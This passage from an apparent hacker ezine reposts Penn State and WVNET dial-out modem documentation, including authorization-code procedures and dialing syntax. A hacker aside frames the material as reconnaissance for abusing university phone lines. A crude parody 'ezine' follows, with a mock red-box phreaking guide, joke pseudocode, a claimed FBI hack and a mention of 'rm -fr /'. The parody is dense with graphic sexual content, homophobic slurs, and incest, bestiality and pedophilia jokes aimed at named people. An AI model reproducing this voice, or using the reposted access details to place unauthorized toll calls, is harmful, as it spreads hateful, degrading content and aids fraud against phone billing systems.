            few minutes to see if the service was busy. If the connection
            never completes, call (814) 863-HELP (863-4357) and press 2
            for Data Service problems. Report any problem accessing the
            DIALOUT service. Someone will check it out and get back to
            you.
            Please do not send EMAIL to OTC to report a trouble. A timely
            response to the trouble reported in this manner cannot be
            guaranteed.

  Advanced Features

       The DIALOUT service can be used to place modem calls to numbers
       that have a toll charge associated with them. The procedure for
       accomplishing this is detailed in the following paragraphs and in
       Appendix 4.

    Long Distance Billing ("Toll")
            Modem calls to services that are not local (to State College)
            or "800" calls can be billed to a phone number (account) at
            Penn State. An Access Code and an Authorization Code are
            needed to place these types of calls. The Access Code is 175
            for any DIALOUT session (or phone line on campus). The
            Authorization Code must be requested on a special form (see
            section 4.2). A unique private password (Authorization Code)
            is then assigned and sent to the requester.

    Required Forms
            The form for requesting a "Long Distance Authorization Code"
            can be found in Appendix 5. It must be submitted to the OTC
            Business Office for processing.

    Security Considerations
            The Authorization Code is the "key" that unlocks access to a
            billing account associated with a telephone at Penn State. It
            should be treated the same as physical access to that phone.
            That is, the Authorization Code should be given ONLY to the
            person or people who are permitted to charge phone calls to
            that budget and fund number.

  Availability

       This service is available for use only from computers that have
       access to the Penn State Data Backbone. These computers include,
       but are not limited to, computers on a network which has a router
       on the backbone and computers or terminals which connect through
       any of the dialup or direct serial ports which are connected to
       the backbone.
       If a requirement for access from other sites is defined, a letter
       explaining the intended use, expected load in number of calls per
       day and expected duration of each call should be written to:


                Penn State University
                The Office of Telecommunications
                Data Services Group
                101 Telecommunications Building
                University Park, PA 16802-5800

    Initial Capacity
            OTC has initially sized this DIALOUT service with a small
            number of available lines (modems) and will monitor the use
            of those to determine the requirement for adding additional
            lines.

    Future Service Expansion
            As modems standards advance and hardware/software becomes
            available, OTC will upgrade the DIALOUT service to take
            advantage of these standards.

    Documentation On-line
            This document is available on-line via anonymous FTP at the
            site FTP.OTC.PSU.EDU in the files
            ftp://ftp.otc.psu.edu/pub/otcdoc/dialout.txt (ASCII text) and
            ftp://ftp.otc.psu.edu/pub/otcdoc/dialout.ps (postscript). The
            most current version of the document will always reside
            there.

     _________________________________________________________________

References



  "V.32 User Guide"


                Penn State University
                The Office of Telecommunications
                Data Services Group
                101 Telecommunications Building
                University Park, PA 16802-5800
                +1 814 863 1354

       (Also available from ftp://ftp.otc.psu.edu/pub/otcdoc/v32_user.txt
       (ASCII text))


  "Serial Line Internet Protocol Overview"


                Penn State University
                The Office of Telecommunications
                Data Services Group
                101 Telecommunications Building
                University Park, PA 16802-5800
                +1 814 863 1354

       (Also available from ftp://ftp.otc.psu.edu/pub/otcdoc/slip.txt
       (ASCII text) and ftp://ftp.otc.psu.edu/pub/otcdoc/slip.ps
       (postscript))


  "A Guide to the Penn State Data Backbone"


                Penn State University
                The Office of Telecommunications
                Data Services Group
                101 Telecommunications Building
                University Park, PA 16802-5800
                +1 814 863 1354

       (Also available from ftp://ftp.otc.psu.edu/pub/otcdoc/backbone.txt
       (ASCII text)) and ftp://ftp.otc.psu.edu/pub/otcdoc/backbone.ps
       (postscript))

     _________________________________________________________________

Glossary

   ANSI
          American National Standards Institute
          Also a terminal emulation type. Similar to DEC's VT100 terminal
          type.

   AutoDial
          1. noun: a modem that can be commanded to perform dialing
          sequences to originate a phone call.
          2. verb: process of placing a phone call without manually
          dialing the numbers, etc.

   Baud
          Units of information per second.
          Examples:

          + Bell 103 (300 Baud) modems convey 300 bps of information.
          + Bell 212 (600 Baud) modems convey 1200 bps of information,
            where each baud contains two bits of data.
          + V.22bis (600 Baud) modems convey 2400 bps of information,
            where each baud contains four bits of data.

   Bell 103
          Standard for 300 bps modems.

   Bell 212
          Standard for 1200 bps modems.

   bps
          Bits Per Second (sometimes confused with BAUD)
          Number of logical "1" and "0" pieces of information per unit of
          time (second).

   DCE
          Data Communications Equipment.
          Example: Modem.

   DIALIN
          1. noun: remote (to PSU) service accessible with a modem.
          2. verb: the process of connecting to such a modem service.

   DIALOUT
          1. noun: PSU service that enables data backbone users to
          originate modem connections to nonPSU services.
          2. verb: the process of using a modem to connect from a host,
          to another that has a modem DIALIN.

   DTE
          Data Terminal Equipment.
          Examples: Terminal, PC, MAC.

   MNP
          Microcom Networking Protocol.
          A class (series of levels) of software enhancements used over a
          communications path (modem).
          Example: MNP Level 4 is similar in function to V.42. MNP Level
          5 enables compression up to 2:1 ratio on some data.

   RxD
          Received Data.
          The data which is received by the DCE and sent to the DTE.

   SLIP
          Serial Line Internet Protocol.
          A method of connecting two devices that understand Internet
          Protocol over a serial line or modem.

   TELENET
          A service provider company which can be accessed with a modem
          or DIALOUT.

   TELNET
          A protocol for remote terminal connection on the data backbone.

   TxD
          Transmitted Data.
          The data which is sent from the DTE to the DCE for transmission
          over the communications link.

   V.22bis
          Standard 2400 bps modem protocol.

   V.32
          Standard 9600 bps modem protocol.

   V.32bis
          Standard 14,400 bps modem protocol.

   V.42
          Standard data integrity and link layer interface. Used with
          modems to ease application software definition.

   V.42bis
          Standard compression algorithm. Allows 4:1 compression on some
          data. Does not try to compress binary data.

   VT100
          Digital Equipment Corporation (DEC) terminal type. Similar to
          ANSI terminal type.
          This terminal is emulated by many TELNET packages on devices
          which attach to the data backbone.

     _________________________________________________________________

Appendices

    "AT" Command Set

        Command
                Description

        AT
                ATtention - prefix to all commands

        D
                Dial - command causes modem to go "off hook" and
                interpret following commands for dialing

        T
                Tone - DTMF "TouchTone" option to "D" command

        W
                Wait - causes a pause until next dialtone is detected

        ,
                (comma) - causes a one-second pause in a dialing sequence
                (ignores all signals on phone line)

        0,1,...,9
                digits - used for telephone numbers and other numbers in
                dialing sequences

         _____________________________________________________________

    Example DIALOUT Sessions
            ________________________________________________________

          "Local" (Tymnet)

telnet dialout
Connected to dialout.psu.edu.

OTC's Network Terminal Service
This service is only for use authorized by Penn State
at
OK
atdt82343853
DIALING

CONNECT 2400

BUFFER 38400

Please log in: PSU_test

error, type user name:
            (An authorized Tymnet user could now login...)
              ________________________________________________________

          "800"

telnet dialout
Connected to dialout.psu.edu.

OTC's Network Terminal Service
This service is only for use authorized by Penn State
at
OK
atdt818002341998
DIALING

CONNECT 9600

BUFFER 38400

UNAUTHORIZED ACCESS IS PROHIBITED.
            All use of this system is governed exclusively by the Terms
            and Conditions of a Digital Business Agreement if one is
            currently in effect between your company and Digital, or the
            Standard Terms and Conditions of Sale (including Software
            License) with Digital Equipment Corporation. The Terms and
            Conditions of Sale are available on the E-Connection Services
            Menu for review.

Port name: _LTA4974:
Welcome to Digital's Electronic Store.
     Please wait a moment for start up ...

Terminal type: VT220

Digital's Electronic Connection
            For assistance call:  1-800-DIGITAL

Welcome to the Electronic Connection

HOURS:  7 a.m. - 12 Midnight Eastern Time
            [...]
              ________________________________________________________

          "Toll Call"
            Here is an example of a call to a long distance modem which
            was busy at the time of the attempt.

telnet dialout
Connected to dialout.psu.edu.

OTC's Network Terminal Service
This service is only for use authorized by Penn State
at
OK
atdt175w1234567w814089884004
DIALING

BUSY
at
OK
            Note the Access Code (175) and the Authorization Code
            (1234567). This Authorization Code is obviously invalid, and
            would be replaced by a valid one for an actual DIALOUT
            session.
         _____________________________________________________________

    Frequently Called Numbers

                                           DIALOUT
Service           Speed  Location          Phone Number
----------------  -----  ----------------  ------------
TBAWL (Public)    2400   State College PA  82385559
TBAWL (Members)   2400   State College PA  82376778
  TBAWL = (The Blue & White Lion Bulletin Board)

CompuServe        2400   State College PA  82387910

Telenet           2400   State College PA  82311510

Tymnet            2400   State College PA  82343853
Tymnet            9600   Norristown PA     812156290567
Tymnet            9600   Pittsburgh PA     814126422271

Digital Equip.    9600   7AM-Midnight EST  818002341998

McAfee BBS        2400   Santa Clara CA    814089884004

WordPerfect BBS   1200   Orem, UT          818012254414

       _____________________________________________________________

    Authorization Code Implementation
            ________________________________________________________

          Purpose
            Authorization Codes (Auth Codes) allow a level of security on
            a modem (or phone) line so that unauthorized long distance
            calling is prevented. A modem line can be restricted to local
            or on-campus calling only. However, by dialing the
            Authorization Code Access Number (175) followed by the
            seven-digit Auth Code the line's class of service is
            (temporarily) changed to a level where a long distance call
            can be completed and be charged against the Auth Code. Only
            by using an Auth Code can long distance calls be completed
            from the restricted station.
            Two types of Auth Codes are be implemented on our phone
            switch. They are Non-Station Specific Auth Codes and Station
            Specific Authorization Codes. Non-Station Specific Auth Codes
            can be used from any University modem (or phone) line to
            change its restricted status and allow a toll call to be made
            and charged against the Auth Code. Station Specific Auth
            Codes must be used at the telephone station to which the Auth
            Code has been assigned.
            The Office of Telecommunications is supporting both
            Non-Station Specific Auth Codes and Station Specific Auth
            Codes. However, it is preferable to use Station Specific Auth
            Codes because they provide the higher level of security.
            There will be times when Non-Station Specific Auth Codes are
            required and these applications will be supported. For most
            applications, we recommend Station Specific Auth Codes be
            used.
            Note that the DIALOUT service REQUIRES a Non-Station Specific
            Auth Code.
              ________________________________________________________

          Terminology

              Auth Code
                      Authorization Code - A code which allows a caller
                      to override the calling restrictions placed against
                      a phone line.

              SS
                      Station Specific Auth Codes must be used at the
                      telephone station to which the Auth Code has been
                      assigned.

              SW
                      Non-Station Specific Auth Codes can be used from
                      any University telephone.

              TSR
                      Telecommunications Service Request. This is the
                      form on which all requests for services from the
                      Office of Telecommunications should be submitted.

              ________________________________________________________

          Procedure
            All requests for Auth Codes require that a TSR and a Long
            Distance Authorization Code Data Collection Form be
            completed. The TSR can be completed by either the
            Communications Analyst (CA) or the department requesting the
            Auth Code. The Long Distance Authorization Code Data
            Collection form must be filled in by the CA.
            Both forms must include the date that the Auth Codes are to
            be activated and whether Non-Station Specific Authorization
            Codes or Station Specific Authorization Codes are being
            requested.
            Attached to the TSR should be a Long Distance Authorization
            Code Data Collection Form which should be filled out with the
            information shown in Appendix 5.
              ________________________________________________________

          Discontinuing Use of Long Distance Authorization Codes
            If a department decides to discontinue the use of
            Authorization Codes, the department will need to complete a
            TSR listing the telephone numbers and existing authorization
            codes that are to be discontinued. A most important component
            of this TSR will be the date. The date on the TSR should be
            considered the date for the Business Office to remove the
            restrictions on the lines and the date the listed Auth Codes
            are to be removed from the switch.
       (adapted from original OTC procedure)
         _____________________________________________________________

    Long Distance Auth Code Data Collection Form
       The form is to be completed by the appropriate Communications
       Analyst (CA) (call 865-1940 and ask to speak to your "CA").
       The form requires the following information:
         1. Name of the person being assigned the code.
         2. The type of code being used.
            SS designates Station Specific Authorization Codes.
            SW designates a Non-Station Specific Auth Code.
         3. The telephone number of the person to whom the code is being
            assigned. If the person being assigned the Auth Code has a
            Meridian Business Set it will be necessary to note that and
            indicate which line the Station Specific Auth Code is to be
            assigned against.
         4. The budget number that the assigned Auth Code will be charged
            against. In some cases authorization codes may be charged
            against different budgets and it is necessary that the
            appropriate budget be listed for each code.
         5. The line indicated under telephone number in most cases will
            be restricted as part of the order. Typically a DIALOUT user
            will not want their desk phone to be restricted from making
            long distance calls. Make sure that the CA does NOT enter
            this field unless it is desirable to restrict the phone so
            that long distance calls must always use the Access and Auth
            codes.
         6. The office location of the person being assigned the Auth
            Code. Upon receipt of the TSR and the attached Data
            Collection Form, the Business Office will log in the TSR and
            assign Auth Codes to each individual listed on the form.Auth
            codes cannot be listed on the TSR itself (it goes back to the
            department and may be seen by anyone.)

   (adapted from original OTC procedure)

     _________________________________________________________________

   Last updated 1/6/98
   Send comments and suggestions to webmaster@otc.psu.edu.



.. Now if they were smart this site would only be accessable to the university
and not to the entire net. But no. Here is the last and final peice.

                                Dialout Modems

   WVNET provides a pool of dial-out modems for network users who need
   telephone access to other computer resources, such as Telenet, TYMNET,
   Compuserve, or bulletin board systems (BBSs).

     * Before You Start
     * Access Instructions
     * Exiting Dialout
     * Where to Connect
          + Telenet
          + TYMNET
          + Compuserve
     * If You Have a Problem

Before You Start

   Following are some important points to keep in mind:

     * Protocols for the outbound modems are preset and cannot be changed
       by users. For Parity Challenged users, WVNET provides two
       different outbound modem service connections:
          + DIALOUT: for 8 bits/No Parity modem connections.
          + DIALOUTE: for 7 bits/Even Parity modem connections.
     * The modems operate at 300/1200/2400 autobaud; however, your
       terminal server connection into them may be set at any speed.
     * Modems are Hayes compatible, using the conventional "AT" command
       syntax.
     * Unless you have an authorized TID number, these modems will not
       work for long-distance service. They are intended for local use
       (Morgantown area) and toll-free calls only.
     * The outbound modem connects to WVNET's Centrex 293 exchange.
          + To dial within this exchange, prefix your four-digit number
            with a "3".
          + To dial outside of this exchange, or to make a toll-free
            call, you must first dial the digit "9".
          + To make a long-distance TID call, you must first dial the
            digit "8", the actual telephone number, followed by several
            pauses (commas) and your TID number.
     * Xmodem and Ymodem protocols do not currently work when passing
       through the WVNET terminal server. This obviously precludes the
       use of these two file transfer protocols through the dialout
       modems.

Access Instructions

   Access instructions are provided for the DIALOUT service; they are
   identical to the DIALOUTE service. The example provided below shows a
   user attempting to connect to a 2400 bps service outside of WVNET's
   293 exchange. See Outbound Modem Result Codes for other possible modem
   result codes.
     _________________________________________________________________

   Outbound Modem Result Codes


 Result Code Word     Result Code Description



 OK                   Acknowledges execution of a command line

 BUSY                 Modem detected a busy signal

 CONNECT              A connection has been established at 300 bps

 CONNECT 1200         A connection has been established at 1200 bps

 CONNECT 2400         A connection has been established at 2400 bps

 ERROR                User command was not recognized or is too long

 NO CARRIER           Failure to connect or loss of carrier

     _________________________________________________________________

    1. At the terminal server prompt, enter the command:

       C DIALOUT


       If successful, you should see a message like the following:

       Local -010- Session 1 to DIALOUT on node WVN059 established


    2. At this point, you should be connected to the modem. To verify
       this, you can enter the modem attention command:

       AT


       The modem should respond with the result code:

       OK


    3. You may now dial a number using the ATDT command. For example, to
       dial Morgantown's local 2400-baud Telenet pad, you would enter
       (remember to add the "9,"):

       ATDT 9,292-0492


    4. The modem should respond with the number you are dialing. In this
       example, it should look like this:

       DIALING T 9,292-0492


    5. If the telephone connection is successfully made, you should see
       the result code:

       CONNECT 2400


    6. At this point, some remote services may require you to press
       RETURN or enter some other wake-up command.

Exiting Dialout

   If you successfully connect to an outside computer resource via the
   outbound modem, you should be automatically dropped back to the
   terminal server when you quit from the resource.

   If you are still at the outbound modem, issue the modem command:


 ATF



   to exit from the modem and return to the terminal server prompt.

Where to Connect

   Aside from BBS access, the dialout modem user can access several local
   Morgantown pads, such as for Telenet, TYMNET or Compuserve.

  Telenet

   The telephone number for Morgantown's local 2400-baud Telenet pad is
   292-0492 (see the Access Instructions above). Upon a successful
   connection, you need to provide a wakeup command, which depends upon
   whether you are using DIALOUT (N81) or DIALOUTE (E71).

     * DIALOUT: D <cr>
     * DIALOUTE: @ <cr> <cr>

   If you are successfully connected, Telenet will prompt you for a
   terminal type:


 TERMINAL=



   Respond with D1 if you are using a CRT or a PC.

   Telenet product and service information is available by calling
   800-736-1130 (voice only).

  TYMNET

   The telephone number for Morgantown's local 2400-baud TYMNET pad is
   292-3092 (see the Access Instructions above). TYMNET is supposed to
   support both N81 and E71 protocols.

   When you get the CONNECT 2400 message, you must quickly provide a
   terminal identifier before the system drops you.

   If you are connecting via DIALOUT, type the letter o (do not hit a
   carriage return ) until you see a login prompt.

   If you are connecting via DIALOUTE, type the letter a (do not hit a
   carriage return ) until you see a login prompt.

   Help is available by typing HELP at the logon prompt. TYMNET general
   information is available by calling 800-937-2862 (voice only).

  Compuserve

   The Morgantown area has direct Compuserve telephone access number to
   support a range of baud rates. Because the dialout modems are limited
   to 2400 baud, it would not be practical (or economical!) to list
   numbers for higher baud rates. The telephone number for Morgantown's
   local 2400-baud Compuserve pad is 291-5884 (see the Access
   Instructions above). Note that Compuserve prefers E71 protocol.

   Compuserve customer service is available by calling 800-848-8990
   (voice only).

If You Have a Problem

   The dialout modems present an interesting problem to the user. Using
   them is somewhat akin to navigating with only instruments to guide
   you. Your vision is limited to what little you can see on your screen,
   and you cannot hear what the dialout modem is doing.

   Are you using the appropriate numeric prefix when you dial? See Before
   You Start for the correct prefix.

   One known problem with the dialout modems is with the use of the
   carriage return/line feed combination <CR/LF>. To our knowledge this
   only affects you if you are using a TELNET protocol to connect to the
   dialout modem. Your software should be configured to send only a
   carriage return <CR>. If your software is sending a <CR/LF>, you will
   see the modem responding with
DIALING

   , followed by
OK

   , when you attempt to dial a number with the ATDT command:


 ATDT 35001

 DIALING

         OK

   If your software is working properly, you should see something like
   this:


 ATDT 35001

 DIALING T 35001



 CONNECT 2400

-- E0F --

!b4b0!b4b0!b4b0!b4b0!b4b0!b4b0!b4b0[ 11 ]b4b0!b4b0!b4b0!b4b0!b4b0!b4b0!b4b0!b4b

[ Editor's Note: This is NOT written by B4B0, rather it is an ezine,     ]
[ done by Mr. DethCraze, famous for the Pro Hosting "rm -fr /" incident. ]
[ This is included strictly for the intent of humor, whether you find it ]
[ amusing or not.                                                        ]


  @
 \|/    _
 /'\  /"\@   <-- "RaM iT iN mE JOeY!@$#"

mE & gRaNdPa!$#$!@#

ThE rAdCrAz eZiNe %Issue 1%  by DeathCraz
/////////\\\\\\\\\\
-------------------

      cOnTeNTZ!@#$
      ************

1#......% -> InTrOduCtiOn <-
2#......% -> hOw teW clEan aN aNuS <-
3#......% -> rIpPeD aNuS cODe!@#$ <-
4#......% -> hOw tO bUiLd a rEd bOx <-
5#......% -> uSiNG a rEd bOX <-
6#......% -> hAx0Rz i pHEaR
7#......% -> a sOnG wRiTTeN bY mE!@#$ <-
8#......% -> 10 rEaSoNz wHy iM oWNeD <-
9#......% -> hOw i HaCkEd tHe fBi <-
10#.....% -> grEEtz <-
11#.....% -> fuck yEw'Z!@#$ <-




sEcTiOn #1 - iNtRoDuCtIon
-------------------------

y0yO tHIs Is dEaThCrAz wUSSUp!@#$ i DiD THiS eZiNe bEcAuSe oF aLL tHE gaY aNaL
fRuStRaTiOn i HaD bUiLT uP iNSiDe OF mE, sO i FeLT tHE n33d tO eXpReSS
mYsElF, aNd wHaT beTTeR wAy tHRoUGH aN eZiNE?!?@#! oK hErE gOeS lAmErZ,
rEmEmbER, nO mAtTeR hOw MaNy tImEz yOu rEaD tHiS zInE, yOu wILL nEvEr bE aS
eLiTe aS eYe aM!@#$ hOHoHO, UnlEsS oF cOuRsE yoU rEaD fUtUrE iSsUeZ oF mY
zInE!@#$ tHeN yoU wIlL bE 1/1000 eLiTe, nO lIKE 1/10000 eLiTe aS i Am. lIkE
oK bIzNaTchEZ, sToP pLaYin wITh uR bAllZ aNd ReAd tHE rEsT oF thIs fILE!@#$

sEcTiOn #2 - hOw tEw clEan aN aNus
----------------------------------

i HaVe sEen pEopLe oVeR aND oVeR aGaIn AftEr a GaY oRgY uNpROpErLY clEaNinG
tHieR anUsEs. sO i wRoTe ThiS seCtIon On hOW tO cleaN aNd jERk aN anUS wIth
eXtReMe sKIll. ThE fIrSt sTeP iS iNdUcEd dIArHeAa tO eXpEL eXcEss fLuIds sUch
aS cUm, blOod, pIss, sHiT, oR swEaT. eAtInG aBoUT fOuR boTTlEs oF lAxAtIVe
sHiT sHOuLD dEw iT. aFtEr yOu pOoP, tHe nExT stEp iS rEmoViNG sOliD oBjECTz
frOm tHE rEcTuM. dOnT bE aFrAiD tO sTiCk uR hAnD rIGhT uP thErE aND pULL oUT
aNy fOrEiGn oBjEcTs. YoU'dE bE sUrpRisEd hOw mANy tImeZ i'Ve dOnE thIs aNd
fOunD sParE dILdO's, fOOd, sHoEz, eTc... nExT yOu tAkE a gArDeN h0sE aND
sHoVe iT uP jEwR aSS aT fULL blAST!@#$ OoOoO THaTs a ruSH!@#$ =) shIt aNd
sEmEn wILL stArT sPILLiNG aLL oVeR dA plAcE, jUsT wIGGlE aNd pReTeND thAt
uR doInG soMeThinG l33t. nOw, foR tHE fInaL sTeP, u nEeD oNe oF tHoSe aIR
hOsEs fOunD aT thE gAs sTaTiOn. jUsT wAlK uP thErE whEN nO oNE is ArOunD,
pULL dOwN uR uNdAwEaRz, aNd sHOoT aIR uP uR anALZ!@# nOw YoU hAVe seXsEsfuLLy
cLeaNeD aN aNus!@#$ yOU aRe wELl oN uR wAy tO bEcOmInG eLiTE. dOnT bE aFrAiD
tO bEnD oVaH iN fRoNT oF pEoPLe aNd ShOW tHeM uR aNus!@#$ tHeY wILL sCrEaM
aNd RuN iN phEaR cAuSe u gOt thE aNus clEanInG sKILL!@$

sEcTiOn #3 - rIpPeD aNuS cODe!@#$
---------------------------------

hEy boYz, lOOk wHaT dEaThCrAz hAs fOr yOU!@#$ rIPpeD aNUs c0DE!@$!#!#$
pR0Pz tO mY mEnToR (GraNdPa FrAnkY) fOr hElpInG mE wITh ThIs c0de. hE iS tHE
bEsT aNuS hax0r iN aLL oF cAnAdA!@#$ (tRuSt mE, hE hAs tEsTeD tHis c0De oN mE
oOdLeS oF TImEs)

---sNiP--

*/ aNuS.c bY dEaThCrAz aND gRaNdpA */

#iNcLudE <aNuS.h>
#iNcLudE <hAcKeR.h>
#iNcLudE <DiLdO.h>

iNt kNEEL()
{
  iF vIcTiM==sTaNdInG tHeN pRiNTf("drOp tO jEwR kNEEZ BiaTCH@!$"/n)
}
iF vIcTiM=sTaNdInG gOtO kNEEL()

iNt aNuShAcK()
{
   iF vIcTiM==BeNt oVeR tHEN pRiNTf("h0h0h0"/n)
   pULL dOwN vIcTiM's pAnTs
   iNsErT PeNis
}

   fOr pEniS iN ()aNuShAcK dO s3x0r wHiLe cUm()

     uNtIL aNuS=bEaT
doNE

pRiNtF("0wn3d@!#$@#$!"/n)
--eNd oF cOde sNip--

dOnT eVeN tHINK aBoUT rIpPinG tHIs eLiTE c0De laMeRZ!@#$ mE aNd mY gRaNdPA
gOt cOpYrIGHTZ oN diS shIT!@#$

SEcTiOn #4 - hOw tO bUiLd a rEd bOx
-----------------------------------

aS yOu mAY kNoW, i aM aN eLiTe phReAKeR, aNd i wIlL tEaCh yOu tHe aRt oF
BuIlDiNG a rEd bOx!@$ oK lIKE, gET uR tALkBoY hAnDy, aNd pIcK uP uR tElEpHoNE.
nOw, aSk thE oPeRaTOR POLiTeLy tO plAy sOmE rEd bOx tOnEs, sOuND pROfEssIONAl,
lIkE yOu aRe a lInEmAn oR soMe ShIT. i sOuND lIKe a PekEr oN thE fONe, sO i
uSeD tAlKbOY tO haXoR mY vOIce tO soUnD lIKE a chIpmUnk. wHeN tHE OpeRaToR
pLaYs tHe ToNEs, pReSS reCoRd oN uR tAlKbOI, aNd bEwM!@#$ U gOT a rEd bOX!@$
yOu gOTa bE CArefUL tHOuGH, oR thE fBi wILl kNocK oR uR dOOr aNd cONfIScAtE
uR tOnEz. tHeRe Is aNoTheR wAy Of mAkInG a rEd bOX, bUt iT iS rEaLlY cOnFusInG
aND sHiT, u GoTtA fUX wiTH cRyStAlz oR sOmEtHiNG. bLaH@#$

SeCtIoN #5 - uSiNG a rEd bOx
----------------------------

i LiKE tO rEd bOx tHe pOlIcE, tEaChERz, aNd aNyOnE eLsE tHaT pIsSeS mE oFF.
mY gRaNdpA lEtS mE rEdBOx hIm iN thE aNuS, sO i hAvE sOmEoNe tO pRaCtIcE oN
wHeN i gEt tO tIgHteR aNuSeS!@# nOw i wILl sHoW yOu hOw tO hAxOr a gAy mAn's
aNuS wItH a rEd bOx!@$ oK 1sT sTep: bUiLd dA fUcKiNG rEdBoX. tHeN u fInD a
gAy mAn. tHiS sHOulDn't bE toO hArD (gRaNdPA lIVEs rIGHt nEaR mE). oK nOw
sHoVe tHE rEd bOx uP uR pArTneRz aSS. tHeN sTiCk uR wEiNeR iN tHiEr aSS aNd
sTaRt pUmPiNG. yOu wILl hEaR a bUnCh oF tOnEs aNd sHiT!@#$# tHiS mEaNs tHaT
u nOw oWn tHeIr aNus$!@# nOw pUlL oUt dA rEdBoX oUT oF thEiR aSS. iT sHOulD
bE aLl bRoWn aND gReEn aND sTuPh. LiCk iT!@#$ wErD...tHaTs tAsTy...

sEcTiOn #6 - hAx0rZ i pHeAr
---------------------------

yO dEEz aRe bAd aSS fUcKeRz tHaT i phEaR aNd rEsPeCt, cAuSe oF thIeR uB3r
eLiTe h4x0r1nG sKILLz aND sHIT!@#$

EFnet
-----

i pHEaR eVeRyOnE oN eFnEt@!#$

pEoPLE i eSpEciAlLy pHeAR oN efNET
----------------------------------

dangergrl - oNe dAy i hOpE tO kISS tHE gRouND u h4x0r oN@!$#

route - du0d!$#!@$ eYe wILL bLoW yEw fEr vOiCe iN #pHRaCK!@$

daemon9 - y0 BuD wUsSup?!#$@ lEtS gO haXoR a GiBsOn tOgEtHeR@#$

aNd lIKE jUSt aBoUT eVeRyONe iN #pHRaCk i phEaR

UNDERnet
--------

RloXlEY - sHaFT!@#$ dOnT mAiL bOMB mE du0D!$#

sErIaLbOx - hEy uR fInE aND sHIT@!$# tEaCh mE skILLZ@#$!

bLaCkOpS - u dONT TaLk bUt i sTiLL pHEaR jEw!@$#

tRaJeK - pROTeCT mE fRoM tHe bAd-GuYs iN #hIsEc!$@#

eVeRyOnE iN #hAcKpHreAk

sEcTiOn #7 - a sOnG wRiTTeN bY mE!@#$
-------------------------------------

yOyOyO!#$@ tHiS iS dEaThCrAz fUcKeRz, pHEaR aND bOw
sInG tHiS sOnG, wHiLe i wIpE cUm oFF mY eYeBrOw
i bLoW yOu aNd sUcK uP, yOu bEtTeR lIkE mE,
oR i'LL bE fOrcEd tO dRiNk sHIt aNd pEe
plEaSe gIvE mE a shEll, mY tRiPlE oC goT hACkEd
iF mY mOm cAtchEs mE wEaRiNg hEr pAnTiEs iLL gEt smAcKeD
iM gAY aS hELL, bUt i dOnT cArE
iF yOu tEaCh mE hOw tO haCk, i'Ll sNiFF uR uNdeRwEaR
mY mOmMY fUcKs mY bRoThEr, iM aN inBrEd hIck
bUt thAt's oK, CaUsE i hAvE a RuBBeR dIck
iT tWaS tHe nIgHt bEfOrE cHrIsTmAs aNd aLL tHrOuGh tHe hOuSe
dEaThCrAz wAs dOwNsTaIrz hAvInG aNaL sEx wItH a dEaD mOuSe
nOw aS i sIt hErE NiBBlInG oN cOrN
wAcKiNG ofF mY dAd aNd wAtChINg gAy pOrn
tHiNK tO UrsElF, "iF i wErE dEaThCrAz fOr a dAy"
iT wOuLD bE sO sWeEt, i wOuLd bE gAy.
bUt tHaT iS oKaY bEcAuSe yOu fUcKeRz aReNt mE
i LaUgH aT yOu fUcKeRs aNd gIgGlE "hEE-hEE"
aT tHe lAmAhZ wHo tRy tO imItAtE tHe mAsTeR
oF gAy pOrN, wArEz, pEdOpHiLiA aNd dIsAsTeR
--->phEaR aNd bOw tO tHa pImP dAddY mAck <---

dEaThCrAz 98' hOeZ.

sEcTiOn #8 - 10 rEaSoNS wHY i aM oWnEd
--------------------------------------

10) gRaNdPa oWnEd mE wiTh aNuS.c
9) i gOt cAuGhT fUcKiNG mY dOg iN tHE aSS
8) JiZZ-sTaIns oN mY wAtEr-bEd
7) i DrAnK a bOtTlE oF lAxAtIvEs (i tHouGHt iT wAs cReaMy jIZZ!@#$)
6) gRaNdPa oWnEd mE wIth aNuS.c
5) i pReTeNd tO kNoW hOw tO uDp
4) gRaNdPa oWnEd mE wItH aNuS.c
3) sAnTa cLaUsE cALLeD mE a fAgGoT
2) rUmP oWnEd mY b0x
1) aNd tHe #1 rEaSoN wHY i aM owNed: GR4NDP4 0WN3D M3 W1TH 4NU5.C!$#!$ j34h

sEcTiOn #9 - hOw i hAcKeD tHe fBi
---------------------------------

aNoTheR oNe oWnED!@$ iT's aLL oVaH tHe pAPeRz!#@ eRrRR.. wAiT wRoNG pHiLe....
oK lIkE, i owNeD tHe fBi aNd sHiT, iT wAs cOol. Huh HUh. oK lIKe tHiS iS wHaT
i dId tO hAx0r tHe fBi. i wAs rUnNiNG aNusPrObE (mY aNaL pRoT sCaNNeR) aND i
cAmE acRoSS fBi.gOv.  sO iM lIKe "wOulDnT iT bE cOOl iF i HaCkEd tHe fBi?!"
j34h iT wOulD bE. sO i fUcKiNg wHiPpEd oUt pHf aNd oWnEd WwW.fBi.gOV!#$#!@$
yOu wOnT sEe iT oN hAcKeD.nEt oR anYtHinG cAuSe' iTs a tAwP sEkReT haCk.
tHeN i CaMe oN uNdErNeT aNd tOlD eVeRyOnE aBoUt iT. iT wAs cOol. hErE iS a
mIrC lOG oF mE.

*** Now talking in #hisec
<DeathCraz> i hacked the fbi.
<DeathCraz> it was cool.
<Rump> DeathCraz: no u didn't
<spdr> bwhaha bullshit
<lore> Deathcraz can hack?
<DeathCraz> yeah
<DeathCraz> i hacked them with pHf ;)
<Rump> HAHHAHHAHAHA
<spdr> lol
<lore> LMAO!#@$
<conso1e> rofl
<DeathCraz> ask trajek!! i really did it!
<Rump> sure
<DeathCraz> i am a great hackre
<Rump> DeathCraz: i've seen you hack before, YOU CANT
-----------------------------------------------------

bLaH bLaH...tHeN thEy gOt JEaLoUs oF mY eLiTe skILLz sO i lEfT...lAmERz

sEcTiOn #10 - grEEtZ
--------------------

y0y0!@#$ shOuToUTs tO dEEz pEEpZ!@#$ u GuYs r0cK mY eLItE fRO!@#$

bUbBaH - aLwAyS kEpT mY bEd wArM wHILe i wAs iN jUvEnIlE hALl

route - w0rd...j00 4r3 th3 gr34t34t h4ck3r 3v3r!@#$

daemon9 - uR kInDa kEwL tEw!@#$ yOu aNd rOuTe aRe e1eeT

serialbox - yO wHoRE#!@$ wUsSuP

GadGet - i CaN aLwAyS cOuNT oN yOu tO iCmP tHE bAd PeOplE wHO bOtHeR mE!#@

bOrGiE - aOl wArEz cOnNeCtIoNZ!@#$

dangergrl - yOu aRe fInE woMaN@!#$ uNF uNF uNF!@#

trajek - yOu eVeR nEeD a bLow dUdE, qUaLL mE

sEcTiOn #11 - fUcK yEw'Z!@#$
----------------------------

yO iD lIKE tO sAy "pHuCk j00" tO thE fOLLoWiNG pEOpLe foR tHe fOLLoWiNG
rEaSoNs@#$!

